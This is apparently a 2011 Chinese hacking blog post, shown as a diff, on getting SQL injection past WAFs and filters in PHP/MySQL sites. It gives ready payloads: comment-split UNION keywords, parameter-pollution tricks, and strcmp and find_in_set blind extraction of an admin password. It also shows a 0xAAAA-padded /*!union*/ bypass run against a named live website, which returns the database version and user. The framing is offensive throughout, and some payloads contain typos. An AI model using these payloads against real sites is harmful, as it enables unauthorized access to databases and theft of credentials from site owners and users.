@@ -1,0 +1,108 @@
+SQL绕过注入最新代码发布:Mr.DzY | 发布时间: 2011年7月10日
+自sql注入发展至今，许多安全文章似乎扭曲了不少人的注射思维，传统的检测注射方法是通过：
+
+and 1=1 , and 1=2 来判断真假从而判断是否过滤完全，当然，也有 or 1=2,or 1=1，或者
+
+在数值注射 例如：id=1+1 或id=2-1,等等
+
+本文的目的不是评判谁的检测方法实用，只是向大家推荐一些新的注射方式，可能早有人提及了:)
+
+注:主要针对php下的mysql注射，可借鉴，就不一一介绍了
+
+首先说判断：
+
+Null值相信大家不陌生吧，可这么用： and 1 is null,and 1 is not null
+
+或: and 2<=3
+
+其实，很多人习惯性的用=号来判断了，但是，如： >= ,<= ,is null,is not null,<>等 都可用于判断
+
+接着说注入
+
+对于注射取值，我们熟悉的就是union select 和 blind sqlinjection（盲注)
+
+先说Union Select
+
+对于常规的注射，我们可以union select 1,2,3,4 或 union/**/select/**/ 1,2,3,4
+
+Ok,看我演示， id=1+u/**/nio/**/n+se/**/lect+1&id=2,3&id=4 够恶心吧？
+
+可绕过国内所有防注射哦:) 这代码运行后效果如上，至于原理我希望大家自己去
+
+查查相关资料，有异议的可给我留言.
+
+当然，在语句传递多个参数时 例如 slect * from table where id = 1 and name = xxx ，我们可这么做：
+
+id=1+union/*&name=*/select+1,2
+
+代入查询后 slect * from table where id = 1 union /* and name = xxx */ select 1,2 
+
+这是一种让常量（变量）失效的技巧，当然，环境要求比较苛刻 
+
+下面说说Blind SqlIjection（盲注)
+
+一般方式，我想大家应该是这么做的： ascii(substring(password,1,1))=56，或者是
+
+ord(mid(password,1,1))=56
+
+在此，我推荐大家还是用子查询，当然，前提是猜出表，字段，可更为准确的得到想得到的数据
+
+此前，仍然向大家推荐一些新型的手法：
+
+find_in_set 例: find_in_set(’56′,ascii(substr(password,1,1)))=1
+
+strcmp 例： strcmp(left(‘password’,1), 0×56) = 1
+
+将这些函数套如子查询就是：
+
+id =1+and+strcmp(substring((sleect+password+from+admin+limit+0,1),1,1),0×55)=1 false
+
+id =1+and+strcmp(substring((sleect+password+from+admin+limit+0,1),1,1),0×56)=0 true
+
+id =1+and+strcmp(substring((sleect+password+from+admin+limit+0,1),1,1),0×57)=-1 false
+
+老外NB 方法 还有 -.-
+
+悲剧还是绕不过去，nnd。要是国内
+
+的站以上几种方法一般都能搞定，老外就是bt。国外php 注射历史悠久手法独特+方法猥琐 射出几率相当高
+
+http://www.0855.tv/index.php?content=more_product&id=-17 and (select 1)=(select
+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAA)+/*!union*/+select+1,2,3,4,5,6–+-
+
+靠，老外果然牛B 那么继续射
+
+http://www.0855.tv/index.php?content=more_product&id=-17 and (select 1)=(select
+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAA)+/*!union*/+select+1,concat_ws(0x7c,version(),database(),u
+ser()),3,4,5,6–+-
+成功得到系统版本、当前数据库用户、用户名.BY:t00ls
